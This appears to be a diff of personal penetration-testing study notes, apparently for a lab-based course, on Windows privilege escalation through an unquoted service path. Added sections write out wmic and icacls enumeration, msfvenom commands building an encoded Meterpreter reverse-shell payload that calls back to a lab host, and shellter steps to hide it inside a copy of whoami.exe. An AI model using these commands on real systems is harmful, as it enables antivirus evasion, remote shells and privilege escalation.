@@ -3566,7 +3566,7 @@ proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
       - pkg encrypted or cleartext
       - SOCKS5 auth flow, how does the credential exchange works.
 
-*** TODO proxychains
+*** proxychains
     + ref: [[https://man.cx/proxychains][proxychains]]
     + src:
     #+begin_src sh
@@ -3584,8 +3584,9 @@ proxychains <program>
       An unquoted search path could ... (be used in privilege escalation)
       (PWK 809)
       #+end_quote
-      - icacls //continue p810
-    + src:
+      - `icacls <folderName>`, (Integrity Control Access Control List), (or use gui to check the acl)
+      - we have write access to a file, which be ran at a higher access
+    + src (Windows post enum):
     #+begin_src cmd
 systeminfo
   ## HOSTNAME
@@ -3612,17 +3613,55 @@ net user /domain <User name> (?)
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
   ## /i not case-sensitive
   ## /v not contains
-  ## found the following result:
+  ## which gives the following result:
     #+end_src
     #+begin_quote
-McAfee Agent Common Services macmnsvc "C:\Program Files\McAfee\Agent\macmnsvc.exe" /ServiceStart Auto
-McAfee Agent Service masvc "C:\Program Files\McAfee\Agent\masvc.exe" /ServiceStart Auto
-McAfee Service Controller mfemms "C:\Program Files\Common Files\McAfee\SystemCore\mfemms.exe" Auto
-McAfee Endpoint Security Web Control Service mfewc "C:\Program Files (x86)\McAfee\Endpoint Security\Web Control\mfewc.exe" Auto
-Puppet Agent puppet C:\Puppet\Current Version\sys\ruby\bin\ruby.exe -rubygems "C:\Puppet\Current Version\service\daemon.rb"
+  ## McAfee Agent Common Services macmnsvc "C:\Program Files\McAfee\Agent\macmnsvc.exe" /ServiceStart Auto
+  ## ...
+  ## *Puppet Agent puppet C:\Puppet\Current Version\sys\ruby\bin\ruby.exe -rubygems "C:\Puppet\Current Version\service\daemon.rb"*
+  ## unquoted service path
     #+end_quote
+
+    + src (targeting the service path):
+    #+begin_src powershell
+icacls "C:\Puppet"
+  ## or just check the file acls in the gui. Is the folder writable?
+  ## *C:\Puppet BUILTIN\Users:(W)*
+  ##     BUILTIN\Administrators:(I)(F)
+  ## ...
+    #+end_src
+    
+*** Unquoted Search Path Exploitation && shellter (AV Evasion, broken)
+    + ref:
+      - [[https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae][windows privilege escalation, Unquoted Service Path]]
+      - [[https://www.shellterproject.com/Downloads/Shellter/Readme.txt][shellter's method]]
     + info:
-      - 
+      - shellter is broken but the doc is worth mentioning.
+      - unquoted Search Path Exploitation and shellter (AV Evasion)
+      - payload:
+        + LPORT=80 outbound, try avoid AV
+      - Sunce the service path is unquoted, the "C:\Puppet\Current.exe" will be executed before the real binary "C:\Puppet\Current Version\..\ruby.exe" on service start
+
+    + src (parse payload):
+    #+begin_src sh
+mkdir -p poultry
+cp /usr/share/windows-resources/binaries/whoami.exe ./poultry/ && cd ./poultry
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f --list
+  ## -f --list list possible formats
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
+  ## -e encode
+  ## -i iteration
+  ## -f raw, output raw payload only
+    #+end_src
+    + src (shellter):
+    #+begin_src sh
+shellter
+  ## Operation Mode: Auto
+  ## PE Target: /full/path/to/whoami.exe
+  ## Stealth Mode? N (the modified binary must still function as before or not)
+  ## Select Payload: /full/path/to/met.bin
+    #+end_src
 
     
 **** Ephemeral port (short live port)
@@ -3650,6 +3689,10 @@ Puppet Agent puppet C:\Puppet\Current Version\sys\ruby\bin\ruby.exe -rubygems "C
   + pivoting: ssh port-forward (local, remote, dynamic)
   + useful linux file structure (/proc, /dev)
   + stand-alone multi/handler and payload
+  + proxychain
+  + use msfvenom, use the different format.
+  + (reflective dll injection)
+  + list all privilege escalation techniques
      
 ** boxes
    1. ensure 100% with msf.
